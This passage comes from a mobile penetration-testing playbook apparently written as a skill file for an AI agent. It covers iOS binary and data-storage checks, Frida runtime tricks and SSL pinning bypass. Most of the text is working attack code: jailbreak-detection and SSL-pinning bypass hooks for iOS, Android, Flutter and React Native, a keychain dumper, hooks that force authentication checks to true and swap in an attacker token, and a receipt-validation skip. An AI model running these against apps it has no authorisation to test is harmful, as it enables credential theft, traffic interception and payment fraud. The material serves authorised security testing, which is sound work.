otool -l /path/to/binary | grep -A 4 LC_ENCRYPTION_INFO
# cryptid 0 = decrypted, cryptid 1 = encrypted
```

| Protection | Check | Missing Impact |
|---|---|---|
| PIE | `MH_PIE` flag in header | ASLR disabled → predictable addresses |
| ARC | `_objc_release` symbol | Use-after-free more likely |
| Stack Canaries | `__stack_chk_guard` | Buffer overflow exploitation easier |
| Encryption | `cryptid` value | Binary readable without decryption |

### 6.2 Decrypting IPA

```bash
# frida-ios-dump (preferred, jailbroken device)
python dump.py com.target.app
# Outputs: decrypted IPA in current directory

# bagbak (alternative)
bagbak com.target.app

# Manual via Frida
frida -U -f com.target.app -l dump_memory.js
# Dump decrypted binary from memory, replace encrypted section
```

### 6.3 Class-dump for ObjC Analysis

```bash
# Dump Objective-C class information
class-dump /path/to/decrypted/binary > classes.h
class-dump -H /path/to/decrypted/binary -o /tmp/headers/

# Search for interesting patterns
grep -r "password\|token\|secret\|apiKey\|isJailbroken\|isRooted" /tmp/headers/
```

---

## 7. DATA STORAGE ISSUES

### 7.1 Sensitive Data Locations

| Location | Path | What to Check |
|---|---|---|
| NSUserDefaults | `Library/Preferences/<bundle-id>.plist` | Tokens, user data, feature flags |
| Core Data (SQLite) | `Library/Application Support/*.sqlite` | Cached API responses, user records |
| Keychain | System keychain database | Credentials, keys (check protection class) |
| Cookies | `Library/Cookies/Cookies.binarycookies` | Session cookies |
| Cache | `Library/Caches/` | Cached API responses, images with PII |
| Screenshots | `Library/SplashBoard/Snapshots/` | App state captured on background |
| Keyboard cache | `Library/Keyboard/` | Autocomplete entries with sensitive input |
| Pasteboard | System pasteboard | Copied passwords, tokens |
| WebView storage | `Library/WebKit/WebsiteData/` | LocalStorage, IndexedDB, cookies |

### 7.2 Inspection Commands

```bash
# On jailbroken device — app sandbox at:
# /var/mobile/Containers/Data/Application/<UUID>/

# Find app UUID
find /var/mobile/Containers -name "com.target.app" 2>/dev/null

# Check NSUserDefaults
plutil -p Library/Preferences/com.target.app.plist

# Check SQLite databases
sqlite3 Library/Application\ Support/Model.sqlite ".tables"
sqlite3 Library/Application\ Support/Model.sqlite "SELECT * FROM ZUSER;"

# Check for sensitive strings in all files
grep -r "password\|token\|bearer\|api_key" Documents/ Library/
```

---

## 8. TRANSPORT SECURITY (ATS)

### 8.1 ATS Exception Patterns

```xml
<!-- Info.plist — check for ATS exceptions -->
<key>NSAppTransportSecurity</key>
<dict>
  <!-- WORST: disables ATS entirely -->
  <key>NSAllowsArbitraryLoads</key>
  <true/>

  <!-- BAD: specific domain exceptions -->
  <key>NSExceptionDomains</key>
  <dict>
    <key>insecure-api.target.com</key>
    <dict>
      <key>NSExceptionAllowsInsecureHTTPLoads</key>
      <true/>
      <key>NSExceptionMinimumTLSVersion</key>
      <string>TLSv1.0</string>
    </dict>
  </dict>
</dict>
```

| ATS Setting | Risk | Notes |
|---|---|---|
| `NSAllowsArbitraryLoads = true` | Critical | All HTTP allowed |
| `NSExceptionAllowsInsecureHTTPLoads` | High | HTTP for specific domain |
| `NSExceptionMinimumTLSVersion = TLSv1.0` | Medium | Weak TLS |
| `NSAllowsArbitraryLoadsInWebContent` | Medium | WebView can load HTTP |
| No ATS exceptions | Low | Proper configuration |

---

## 9. IOS PENTESTING DECISION TREE

```
Testing iOS application
│
├── Device jailbroken?
│   ├── Yes → full testing capability
│   │   ├── Keychain dump → ios keychain dump (§2)
│   │   ├── Filesystem inspection → check all data storage (§7)
│   │   ├── Runtime hooks → Frida/Objection (§5)
│   │   └── Binary analysis → class-dump decrypted binary (§6)
│   └── No → limited testing
│       ├── Re-sign with Frida gadget for runtime access
│       ├── Backup extraction for data analysis
│       └── Network-level testing (proxy + SSL bypass)
│
├── SSL pinning blocking proxy?
│   └── Yes → see mobile-ssl-pinning-bypass SKILL.md
│
├── URL schemes registered?
│   ├── OAuth callback via URL scheme? → hijacking risk (§3.2)
│   ├── Universal Links configured? → check AASA (§4.1)
│   └── Scheme used for sensitive actions? → test interception
│
├── Binary protections adequate?
│   ├── Missing PIE? → ASLR disabled (§6.1)
│   ├── No stack canaries? → overflow risk (§6.1)
│   └── Still encrypted? → decrypt first (§6.2)
│
├── Data storage secure?
│   ├── Tokens in NSUserDefaults? → plaintext extraction (§7.1)
│   ├── Keychain protection class? → AfterFirstUnlock = risky (§2.1)
│   ├── Screenshots captured? → check Snapshots dir (§7.1)
│   └── Keyboard cache? → check for sensitive autocomplete (§7.1)
│
├── ATS configured?
│   ├── ArbitraryLoads = true? → HTTP downgrade possible (§8)
│   └── Domain exceptions? → targeted HTTP interception
│
└── Runtime manipulation needed?
    ├── Jailbreak detection blocking? → ios jailbreak disable (§5.2)
    ├── Need to bypass auth check? → hook + modify return (§5.1)
    └── Need to trace API calls? → method hooking (§5.2)
```


---
# Part 4: iOS Runtime Tricks


## 1. FRIDA RECIPES FOR iOS

### 1.1 ObjC Class Enumeration

```javascript
// List all classes containing a keyword
Java.perform || true;  // NOP for iOS
ObjC.enumerateLoadedClasses({
    onMatch: function(name) {
        if (name.toLowerCase().indexOf('auth') !== -1 ||
            name.toLowerCase().indexOf('login') !== -1 ||
            name.toLowerCase().indexOf('token') !== -1) {
            console.log('[Class] ' + name);
        }
    },
    onComplete: function() { console.log('[+] Class enumeration done'); }
});
```

### 1.2 Method Enumeration for a Class

```javascript
// List all methods of a specific class
var className = 'AppDelegate';
var methods = ObjC.classes[className].$ownMethods;
console.log('[' + className + '] Methods (' + methods.length + '):');
methods.forEach(function(method) {
    console.log('  ' + method);
});
```

### 1.3 Jailbreak Detection Bypass

```javascript
// Comprehensive jailbreak detection bypass for iOS
var paths = [
    '/Applications/Cydia.app', '/usr/sbin/sshd', '/bin/bash',
    '/usr/bin/ssh', '/etc/apt', '/private/var/lib/apt/',
    '/usr/local/bin/cycript', '/usr/lib/libcycript.dylib',
    '/var/lib/cydia', '/var/cache/apt', '/var/lib/apt',
    '/Library/MobileSubstrate/MobileSubstrate.dylib',
    '/private/var/stash', '/.cydia_no_stash',
    '/Applications/Sileo.app', '/var/jb'
];

// Hook NSFileManager
var fm = ObjC.classes.NSFileManager;
Interceptor.attach(fm['- fileExistsAtPath:'].implementation, {
    onEnter: function(args) {
        this.path = ObjC.Object(args[2]).toString();
    },
    onLeave: function(retval) {
        for (var i = 0; i < paths.length; i++) {
            if (this.path === paths[i]) {
                retval.replace(ptr(0));
                console.log('[JB Bypass] fileExistsAtPath blocked: ' + this.path);
                return;
            }
        }
    }
});

// Hook canOpenURL (Cydia URL scheme check)
var app = ObjC.classes.UIApplication;
Interceptor.attach(app['- canOpenURL:'].implementation, {
    onEnter: function(args) {
        this.url = ObjC.Object(args[2]).toString();
    },
    onLeave: function(retval) {
        if (this.url.indexOf('cydia://') !== -1 ||
            this.url.indexOf('sileo://') !== -1) {
            retval.replace(ptr(0));
            console.log('[JB Bypass] canOpenURL blocked: ' + this.url);
        }
    }
});

// Hook fopen for /etc/fstab, /bin/sh checks
var fopen = Module.findExportByName(null, 'fopen');
Interceptor.attach(fopen, {
    onEnter: function(args) {
        this.path = args[0].readUtf8String();
    },
    onLeave: function(retval) {
        if (this.path === '/bin/sh' || this.path === '/etc/fstab' ||
            this.path === '/bin/bash') {
            retval.replace(ptr(0));
        }
    }
});

// Hook fork() — should return -1 on non-jailbroken
var fork = Module.findExportByName(null, 'fork');
Interceptor.attach(fork, {
    onLeave: function(retval) {
        retval.replace(ptr(-1));
        console.log('[JB Bypass] fork() → -1');
    }
});

console.log('[+] Jailbreak detection bypass installed');
```

### 1.4 SSL Pinning Bypass (iOS-Specific)

```javascript
// Hook SecTrustEvaluateWithError (iOS 12+)
var SecTrustEvaluateWithError = Module.findExportByName('Security', 'SecTrustEvaluateWithError');
if (SecTrustEvaluateWithError) {
    Interceptor.attach(SecTrustEvaluateWithError, {
        onLeave: function(retval) {
            retval.replace(ptr(1));  // Return true (trusted)
        }
    });
}

// Hook SecTrustEvaluate (legacy)
var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
if (SecTrustEvaluate) {
    Interceptor.attach(SecTrustEvaluate, {
        onLeave: function(retval) {
            retval.replace(ptr(0));  // errSecSuccess
        }
    });
}

// Hook NSURLSession delegate for certificate validation
var NSURLSession = ObjC.classes.NSURLSession;
if (NSURLSession) {
    try {
        var handler = ObjC.classes.NSURLSessionConfiguration;
        // Hook didReceiveChallenge completionHandler
        Interceptor.attach(
            ObjC.classes.__NSCFURLSessionConnection['- _]redirectRequest:withResponse:completionHandler:'].implementation, {
            onEnter: function(args) {
                console.log('[SSL] Redirect intercepted');
            }
        });
    } catch(e) {}
}

console.log('[+] iOS SSL pinning bypass installed');
```

### 1.5 Keychain Dumper via Frida

```javascript
// Dump all keychain items accessible to the app
function dumpKeychain() {
    var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
    var SecItemCopyMatching = new NativeFunction(
        Module.findExportByName('Security', 'SecItemCopyMatching'),
        'int', ['pointer', 'pointer']
    );

    var classes = [
        'genp',  // kSecClassGenericPassword
        'inet',  // kSecClassInternetPassword
        'cert',  // kSecClassCertificate
        'keys'   // kSecClassKey
    ];

    classes.forEach(function(secClass) {
        var query = NSMutableDictionary.alloc().init();
        query.setObject_forKey_(secClass, 'class');
        query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), 'r_Data');
        query.setObject_forKey_('m_LimitAll', 'm_Limit');

        var result = Memory.alloc(Process.pointerSize);
        var status = SecItemCopyMatching(query.handle, result);

        if (status === 0) {
            var items = new ObjC.Object(result.readPointer());
            console.log('\n[Keychain] Class: ' + secClass + ' (' + items.count() + ' items)');

            for (var i = 0; i < items.count(); i++) {
                var item = items.objectAtIndex_(i);
                console.log('  Account: ' + item.objectForKey_('acct'));
                console.log('  Service: ' + item.objectForKey_('svce'));
                var data = item.objectForKey_('v_Data');
                if (data) {
                    try {
                        var str = ObjC.classes.NSString.alloc().initWithData_encoding_(data, 4);
                        console.log('  Data: ' + str);
                    } catch(e) {
                        console.log('  Data: <binary ' + data.length() + ' bytes>');
                    }
                }
                console.log('  ---');
            }
        }
    });
}

dumpKeychain();
```


## 2. OBJECTION COMMAND REFERENCE FOR iOS

### 2.1 Information Gathering

| Command | Purpose |
|---|---|
| `ios info binary` | App binary info (PIE, canaries, ARC) |
| `ios plist cat Info.plist` | Read Info.plist |
| `ios bundles list_frameworks` | List loaded frameworks |
| `ios bundles list_bundles` | List app bundles |
| `env` | Show app sandbox paths |

### 2.2 Security Bypass

| Command | Purpose |
|---|---|
| `ios sslpinning disable` | Bypass SSL pinning |
| `ios jailbreak disable` | Bypass jailbreak detection |
| `ios jailbreak simulate` | Pretend device is jailbroken |

### 2.3 Data Extraction

| Command | Purpose |
|---|---|
| `ios keychain dump` | Dump keychain items |
| `ios keychain dump --json` | Keychain as JSON |
| `ios cookies get` | Extract cookies |
| `ios nsuserdefaults get` | Read NSUserDefaults |
| `ios pasteboard monitor` | Watch clipboard |

### 2.4 Runtime Manipulation

| Command | Purpose |
|---|---|
| `ios hooking list classes` | List ObjC classes |
| `ios hooking search classes <pattern>` | Search classes |
| `ios hooking list class_methods <class>` | List methods |
| `ios hooking watch class <class>` | Watch all method calls |
| `ios hooking watch method "<method>"` | Watch specific method |
| `ios hooking set return_value "<method>" true` | Force return value |

### 2.5 Filesystem

| Command | Purpose |
|---|---|
| `ls` / `cd` / `pwd` | Navigate sandbox |
| `file download <path>` | Download file to host |
| `file upload <local> <remote>` | Upload file to device |
| `sqlite connect <path>` | Open SQLite database |

---

## 3. RUNTIME HOOKING PATTERNS

### 3.1 Return Value Modification

```javascript
// Force any boolean method to return true/false
function hookBoolMethod(className, methodName, returnValue) {
    var hook = ObjC.classes[className][methodName];
    Interceptor.attach(hook.implementation, {
        onLeave: function(retval) {
            var newVal = returnValue ? ptr(1) : ptr(0);
            retval.replace(newVal);
            console.log('[Hook] ' + className + ' ' + methodName + ' → ' + returnValue);
        }
    });
}

// Examples
hookBoolMethod('SecurityManager', '- isJailbroken', false);
hookBoolMethod('AuthController', '- isSessionValid', true);
hookBoolMethod('AppDelegate', '- shouldEnforceSSLPinning', false);
```

### 3.2 Argument Logging and Modification

```javascript
// Log and optionally modify method arguments
var target = ObjC.classes.APIClient['- sendRequest:withToken:'];
Interceptor.attach(target.implementation, {
    onEnter: function(args) {
        // args[0] = self, args[1] = _cmd, args[2+] = method args
        var request = ObjC.Object(args[2]);
        var token = ObjC.Object(args[3]);
        console.log('[API] Request: ' + request.toString());
        console.log('[API] Token: ' + token.toString());

        // Modify argument: replace token
        var newToken = ObjC.classes.NSString.stringWithString_('attacker_token');
        args[3] = newToken.handle;
    },
    onLeave: function(retval) {
        console.log('[API] Response: ' + ObjC.Object(retval).toString());
    }
});
```

### 3.3 Method Swizzling via Frida

```javascript
// Replace method implementation entirely
var originalImpl = ObjC.classes.PaymentManager['- validateReceipt:'].implementation;

ObjC.classes.PaymentManager['- validateReceipt:'].implementation = ObjC.implement(
    ObjC.classes.PaymentManager['- validateReceipt:'], function(handle, selector, receipt) {
        console.log('[Swizzle] validateReceipt called');
        // Skip validation, return success
        return ptr(1);
    }
);
```

### 3.4 Notification Observer

```javascript
// Monitor NSNotificationCenter for interesting events
var nc = ObjC.classes.NSNotificationCenter;
Interceptor.attach(nc['- postNotificationName:object:userInfo:'].implementation, {
    onEnter: function(args) {
        var name = ObjC.Object(args[2]).toString();
        var userInfo = args[4].isNull() ? 'nil' : ObjC.Object(args[4]).toString();
        if (name.indexOf('auth') !== -1 || name.indexOf('login') !== -1 ||
            name.indexOf('token') !== -1 || name.indexOf('session') !== -1) {
            console.log('[Notification] ' + name);
            console.log('[Notification] userInfo: ' + userInfo);
        }
    }
});
```

---

## 4. COMMON iOS TESTING WORKFLOWS

### 4.1 Quick Security Audit Flow

```bash
# Step 1: Get decrypted binary
frida-ios-dump com.target.app   # or bagbak

# Step 2: Static analysis
class-dump decrypted_binary > headers.h
grep -r "password\|secret\|token\|apikey\|isJailbroken" headers.h

# Step 3: Check binary protections
otool -hv decrypted_binary | grep PIE
otool -Iv decrypted_binary | grep -c __stack_chk_guard

# Step 4: Runtime testing with Objection
objection -g com.target.app explore
> ios keychain dump
> ios nsuserdefaults get
> ios sslpinning disable
> ios jailbreak disable

# Step 5: Traffic interception
# Configure proxy (Burp/mitmproxy) + SSL bypass
# Analyze API calls for auth issues, IDOR, etc.
```

### 4.2 Data Extraction Workflow

```bash
# 1. Connect to app
objection -g com.target.app explore

# 2. Enumerate data stores
> env   # shows sandbox paths
> ls Documents/
> ls Library/
> ls Library/Preferences/
> ls Library/Application Support/

# 3. Download interesting files
> file download Library/Preferences/com.target.app.plist
> file download Library/Application\ Support/data.sqlite

# 4. Dump keychain
> ios keychain dump --json > keychain.json

# 5. Check cookies
> ios cookies get

# 6. Monitor pasteboard
> ios pasteboard monitor
```

---

## 5. iOS-SPECIFIC FRIDA QUICK REFERENCE

| Task | Frida One-Liner |
|---|---|
| List processes | `frida-ps -U` |
| Spawn app | `frida -U -f com.target.app` |
| Attach to running | `frida -U com.target.app` |
| List ObjC classes | `ObjC.enumerateLoadedClasses(callbacks)` |
| Get class methods | `ObjC.classes.ClassName.$ownMethods` |
| Hook method | `Interceptor.attach(ObjC.classes.X['- method'].implementation, {...})` |
| Replace method | `ObjC.classes.X['- method'].implementation = ObjC.implement(...)` |
| Call method | `ObjC.classes.X.alloc().init().method()` |
| Read string arg | `ObjC.Object(args[2]).toString()` |
| Find instances | `ObjC.choose(ObjC.classes.ClassName, {onMatch: ...})` |
| Read memory | `Memory.readUtf8String(ptr)` |
| Find export | `Module.findExportByName('Security', 'SecTrustEvaluate')` |


---
# Part 5: SSL Pinning Bypass


# SKILL: Mobile SSL Pinning Bypass — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSL pinning bypass techniques for mobile platforms. Covers Android and iOS bypass methods (Frida, Objection, Xposed, SSL Kill Switch), framework-specific bypasses (Flutter, React Native, Xamarin), and troubleshooting non-standard pinning implementations. Base models miss framework-specific hook points and multi-layer pinning configurations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [android-pentesting-tricks](../android-pentesting-tricks/SKILL.md) for broader Android testing beyond SSL bypass
- [ios-pentesting-tricks](../ios-pentesting-tricks/SKILL.md) for broader iOS testing beyond SSL bypass
- [api-sec](../api-sec/SKILL.md) once traffic is intercepted for API-level testing


## 1. SSL PINNING TYPES

| Pinning Type | What Is Pinned | Resilience | Common In |
|---|---|---|---|
| Certificate pinning | Exact leaf certificate (DER/PEM) | Low (breaks on cert rotation) | Legacy apps |
| Public key pinning | Subject Public Key Info | Medium (survives cert renewal if key unchanged) | Modern apps |
| SPKI hash pinning | SHA-256 of SPKI | Medium (same as public key) | OkHttp, AFNetworking |
| CA pinning | Intermediate or root CA cert | High (any cert from that CA works) | Enterprise apps |
| Multi-pin (backup pins) | Primary + backup pins | High (fallback pins) | HPKP-aware apps |

### How Pinning Works

```
TLS Handshake
│
├── Server presents certificate chain
│
├── Standard validation (system trust store)
│   └── Passes? continue : connection fails
│
└── Pin validation (app-level check)
    ├── Extract server cert/pubkey/SPKI hash
    ├── Compare against embedded pins
    └── Match found? → allow : → reject connection
```

---

## 2. ANDROID BYPASS METHODS

### 2.1 Frida Universal SSL Bypass

```javascript
// Hooks TrustManager, OkHttp, Volley, Retrofit, Conscrypt
Java.perform(function() {

    // ── TrustManagerImpl (Android system) ──
    try {
        var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TMI.verifyChain.implementation = function() {
            console.log('[Bypass] TrustManagerImpl.verifyChain');
            return arguments[0]; // return untouched chain
        };
    } catch(e) {}

    // ── X509TrustManager (custom implementations) ──
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function() {},
            checkServerTrusted: function() {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;',
        '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
        .implementation = function(km, tm, sr) {
        console.log('[Bypass] SSLContext.init');
        this.init(km, [TrustManager.$new()], sr);
    };

    // ── OkHttp3 CertificatePinner ──
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[Bypass] OkHttp3 CertificatePinner.check: ' + arguments[0]);
        };
        // check$okhttp variant (OkHttp 4.x)
        try { CP['check$okhttp'].implementation = function() {}; } catch(e) {}
    } catch(e) {}

    // ── Retrofit / OkHttp interceptor ──
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient$Builder');
        OkHttpClient.certificatePinner.implementation = function(pinner) {
            console.log('[Bypass] OkHttpClient.Builder.certificatePinner');
            return this; // return builder without pinner
        };
    } catch(e) {}

    // ── Volley (HurlStack) ──
    try {
        var HurlStack = Java.use('com.android.volley.toolbox.HurlStack');
        HurlStack.createConnection.implementation = function(url) {
            console.log('[Bypass] Volley HurlStack: ' + url);
            var conn = this.createConnection(url);
            // Remove hostname verifier
            conn.setHostnameVerifier(Java.use(
                'javax.net.ssl.HttpsURLConnection').getDefaultHostnameVerifier());
            return conn;
        };
    } catch(e) {}

    // ── Conscrypt / BoringSSL (modern Android) ──
    try {
        var Conscrypt = Java.use('org.conscrypt.ConscryptFileDescriptorSocket');
        Conscrypt.verifyCertificateChain.implementation = function() {
            console.log('[Bypass] Conscrypt verifyCertificateChain');
        };
    } catch(e) {}

    // ── Apache HttpClient (legacy) ──
    try {
        var AbstractVerifier = Java.use('org.apache.http.conn.ssl.AbstractVerifier');
        AbstractVerifier.verify.overload('java.lang.String', '[Ljava.lang.String;',
            '[Ljava.lang.String;', 'boolean').implementation = function() {
            console.log('[Bypass] Apache AbstractVerifier');
        };
    } catch(e) {}

    // ── HostnameVerifier ──
    try {
        var HV = Java.use('javax.net.ssl.HttpsURLConnection');
        HV.setDefaultHostnameVerifier.implementation = function(v) {
            console.log('[Bypass] Ignoring custom HostnameVerifier');
        };
    } catch(e) {}

    console.log('[+] Android universal SSL bypass loaded');
});
```

### 2.2 Objection (One Command)

```bash
objection -g com.target.app explore --startup-command "android sslpinning disable"
```

### 2.3 Network Security Config (Debug Override)

```xml
<!-- AndroidManifest.xml: android:networkSecurityConfig="@xml/network_security_config" -->

<!-- res/xml/network_security_config.xml -->
<network-security-config>
  <base-config>
    <trust-anchors>
      <certificates src="system" />
      <certificates src="user" />     <!-- Trust user-installed CAs -->
    </trust-anchors>
  </base-config>
</network-security-config>
```

Workflow: decompile APK → add/modify config → repackage → re-sign → install.

```bash
apktool d target.apk -o target_dir
# Edit res/xml/network_security_config.xml
# Add reference in AndroidManifest.xml if missing
apktool b target_dir -o target_patched.apk
zipalign -v 4 target_patched.apk target_aligned.apk
apksigner sign --ks my-key.keystore target_aligned.apk
adb install target_aligned.apk
```

### 2.4 Xposed / LSPosed Modules

| Module | Method | Scope | Root Required |
|---|---|---|---|
| JustTrustMe | Hooks TrustManager + OkHttp | Per-app | Yes (Xposed) |
| SSLUnpinning | Hooks certificate validation | Per-app | Yes (LSPosed) |
| TrustMeAlready | Global TrustManager bypass | System-wide | Yes (LSPosed) |

### 2.5 Magisk + System CA Installation

```bash
# Install proxy CA as system cert (Android 7+ requires this for system-level trust)
# Method 1: MagiskTrustUserCerts module
# Moves user CAs to /system/etc/security/cacerts/ via Magisk overlay

# Method 2: Manual (requires root)
adb push burp_ca.pem /sdcard/
adb shell
su
mount -o remount,rw /system
cp /sdcard/burp_ca.pem /system/etc/security/cacerts/9a5ba575.0  # hash-named
chmod 644 /system/etc/security/cacerts/9a5ba575.0
mount -o remount,ro /system

# Get correct hash filename:
openssl x509 -inform PEM -subject_hash_old -in burp_ca.pem | head -1
# Output: 9a5ba575 → filename is 9a5ba575.0
```

### 2.6 Manual Decompile → Patch → Repackage

```bash
# Step 1: Decompile
jadx -d decompiled/ target.apk

# Step 2: Find pinning code
grep -r "CertificatePinner\|X509TrustManager\|checkServerTrusted\|ssl" decompiled/

# Step 3: Identify pinning implementation and patch
# Use smali editing for precise control:
apktool d target.apk
# Edit smali files to NOP out pinning checks
# Look for invoke-virtual {checkServerTrusted} and replace with return-void

# Step 4: Repackage and sign
apktool b target_dir -o patched.apk
apksigner sign --ks debug.keystore patched.apk
```

---

## 3. iOS BYPASS METHODS

### 3.1 Frida (SecTrust Hooks)

```javascript
// Hook core iOS SSL validation functions
var SecTrustEvaluateWithError = Module.findExportByName('Security', 'SecTrustEvaluateWithError');
Interceptor.attach(SecTrustEvaluateWithError, {
    onLeave: function(retval) {
        retval.replace(ptr(1));
    }
});

var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
Interceptor.attach(SecTrustEvaluate, {
    onLeave: function(retval) {
        retval.replace(ptr(0));
    }
});

// Hook SSLHandshake (lower-level)
var SSLHandshake = Module.findExportByName('Security', 'SSLHandshake');
if (SSLHandshake) {
    Interceptor.attach(SSLHandshake, {
        onLeave: function(retval) {
            if (retval.toInt32() === -9807) { // errSSLXCertChainInvalid
                retval.replace(ptr(0));
            }
        }
    });
}

// Hook NSURLSession delegate method
try {
    var cls = ObjC.classes.NSURLSession;
    // Hook URLSession:didReceiveChallenge:completionHandler: on delegates
    ObjC.enumerateLoadedClasses({
        onMatch: function(name) {
            try {
                var methods = ObjC.classes[name].$ownMethods;
                for (var i = 0; i < methods.length; i++) {
                    if (methods[i].indexOf('didReceiveChallenge') !== -1 &&
                        methods[i].indexOf('completionHandler') !== -1) {
                        console.log('[SSL] Found delegate: ' + name + ' ' + methods[i]);
                    }
                }
            } catch(e) {}
        },
        onComplete: function() {}
    });
} catch(e) {}
```

### 3.2 Objection (One Command)

```bash
objection -g com.target.app explore --startup-command "ios sslpinning disable"
```

### 3.3 SSL Kill Switch 2 (Jailbreak Tweak)

```bash
# Install via Cydia/Sileo
# Package: com.nablac0d3.sslkillswitch2
# Disables SSL pinning system-wide or per-app via Settings toggle

# Hooks:
# - SecTrustEvaluate
# - SSLHandshake
# - SSLSetSessionOption
# - tls_helper_create_peer_trust
```

### 3.4 Library-Specific Hooks

| Library | iOS Hook Point | Frida Approach |
|---|---|---|
| AFNetworking | `AFSecurityPolicy.evaluateServerTrust:forDomain:` | Return YES |
| Alamofire | `ServerTrustManager.evaluate(_:forHost:)` | Skip evaluation |
| TrustKit | `TSKPinningValidator verifyPublicKeyPin:` | Return success |
| NSURLSession | `URLSession:didReceiveChallenge:completionHandler:` | Call completionHandler with .useCredential |

### 3.5 Manual Binary Patch

```bash
# Find pinning function in binary
strings decrypted_binary | grep -i "pin\|cert\|trust"
# Disassemble and find the validation function
# Replace comparison/branch instruction with NOP or unconditional pass

# LLDB runtime modification
lldb -n TargetApp
(lldb) breakpoint set -n "SecTrustEvaluateWithError"
(lldb) breakpoint command add 1
> thread return 1
> continue
> DONE
```

---

## 4. FRAMEWORK-SPECIFIC BYPASSES

### 4.1 Flutter

Flutter uses Dart's `dart:io` library with BoringSSL underneath. Standard Frida hooks on Java/ObjC layers don't work.

```javascript
// Flutter SSL bypass — must hook BoringSSL directly
// Find ssl_crypto_x509_session_verify_cert_chain in libflutter.so
var libflutter = Process.findModuleByName('libflutter.so');  // Android
// var libflutter = Process.findModuleByName('Flutter');       // iOS

// Hook ssl_verify_peer_cert (BoringSSL function)
// Signature varies by Flutter version — use pattern scanning
var pattern = 'FF C3 ..';  // Example pattern, varies
var matches = Memory.scan(libflutter.base, libflutter.size, pattern, {
    onMatch: function(address, size) {
        console.log('[Flutter] Potential verify function at: ' + address);
        Interceptor.attach(address, {
            onLeave: function(retval) {
                retval.replace(ptr(0));  // SSL_VERIFY_OK
            }
        });
    },
    onComplete: function() {}
});

// Alternative: use reflutter tool for automated patching
// reflutter target.apk
// This patches BoringSSL in the Flutter engine directly
```

**reflutter tool** (recommended for Flutter apps):

```bash
pip install reflutter
reflutter target.apk
# Outputs patched APK that redirects traffic to your proxy
# Also disables SSL verification in the BoringSSL engine
```

### 4.2 React Native

React Native uses platform networking: OkHttp on Android, NSURLSession on iOS.

| Platform | Networking Stack | Bypass Method |
|---|---|---|
| Android | OkHttp3 | Standard OkHttp CertificatePinner hook |
| iOS | NSURLSession | Standard SecTrust hooks |
| Android (Hermes) | Same OkHttp | Same hooks, but Hermes JIT may need additional handling |

```javascript
// React Native Android — same as OkHttp bypass
Java.perform(function() {
    try {
        var CP = Java.use('okhttp3.CertificatePinner');
        CP.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) { console.log('OkHttp3 not found, trying okhttp2...'); }

    try {
        var CP2 = Java.use('com.squareup.okhttp.CertificatePinner');
        CP2.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) {}
});
```

### 4.3 Xamarin

```csharp
// Xamarin pinning typically via:
// ServicePointManager.ServerCertificateValidationCallback
// or custom HttpClientHandler
```

```javascript
// Frida bypass for Xamarin (Mono runtime)
// Hook Mono method: System.Net.ServicePointManager.set_ServerCertificateValidationCallback
var mono_method = Module.findExportByName('libmonosgen-2.0.so',
    'mono_runtime_invoke');
// More practical: hook the managed callback at CIL level
// Use Frida's Mono bridge or objection's built-in Xamarin support

// Objection has built-in Xamarin bypass:
// objection -g com.target.app explore
// > android sslpinning disable   (covers Xamarin on Android)
```

---

## 5. CERTIFICATE TRANSPARENCY & HPKP

| Technology | Status | Impact on Testing |
|---|---|---|
| Certificate Transparency (CT) | Active, enforced by browsers | Mobile apps rarely enforce CT; not a bypass obstacle |
| HPKP (HTTP Public Key Pinning) | Deprecated (2018) | Legacy apps may still check; remove header from proxy response |
| Expect-CT header | Deprecated (2024) | Minimal impact on mobile testing |
| CT in mobile apps | Rare | Only Google apps enforce via custom CT checks |

---

## 6. TROUBLESHOOTING

### 6.1 Common Failures

| Symptom | Cause | Fix |
|---|---|---|
| Bypass script loaded but traffic still fails | Multiple pinning layers | Hook ALL layers: TrustManager + OkHttp + custom checks |
| "Client certificate required" | Mutual TLS (mTLS) | Extract client cert from app bundle/keychain, import into proxy |
| Connection works but no HTTP traffic | Non-HTTP protocol (MQTT, gRPC, WebSocket) | Use Wireshark or protocol-specific proxy |
| App crashes after bypass | Anti-tampering detects hooks | Bypass integrity checks first, then SSL |
| Proxy CA not trusted | Android 7+ user CA restrictions | Install CA as system cert (Magisk module) |
| Flutter app ignores hooks | BoringSSL not hooked at native layer | Use reflutter or native BoringSSL hooks |
| Certificate chain validation timeout | OCSP stapling mismatch | Disable OCSP checks or mock OCSP responder |

### 6.2 Diagnostic Steps

```bash
# Verify proxy CA is installed correctly
# Android:
adb shell "ls /system/etc/security/cacerts/ | grep $(openssl x509 -subject_hash_old -in ca.pem | head -1)"

# iOS: Settings → General → About → Certificate Trust Settings

# Check if target app is actually using SSL (vs. plain HTTP)
# Wireshark filter: tcp.port == 443 and ip.addr == <device_ip>

# Check if Frida is hooking the right process
frida-ps -U | grep target

# Verbose Frida output for debugging hooks
frida -U -f com.target.app -l bypass.js --debug
```

---

## 7. SSL PINNING BYPASS DECISION TREE

```
Need to intercept mobile app HTTPS traffic
│
├── Platform?
│   ├── Android ↓
│   │   ├── Rooted device available?
│   │   │   ├── Yes → Frida universal bypass (§2.1) [FIRST TRY]
│   │   │   │   ├── Works? → done
│   │   │   │   └── Fails? → add Conscrypt + Volley hooks
│   │   │   ├── Still fails? → LSPosed + TrustMeAlready (§2.4)
│   │   │   └── Still fails? → install CA as system cert (§2.5)
│   │   └── No root?
│   │       ├── Debug build? → Network Security Config (§2.3)
│   │       └── Release build? → decompile + patch + repackage (§2.6)
│   │
│   └── iOS ↓
│       ├── Jailbroken device available?
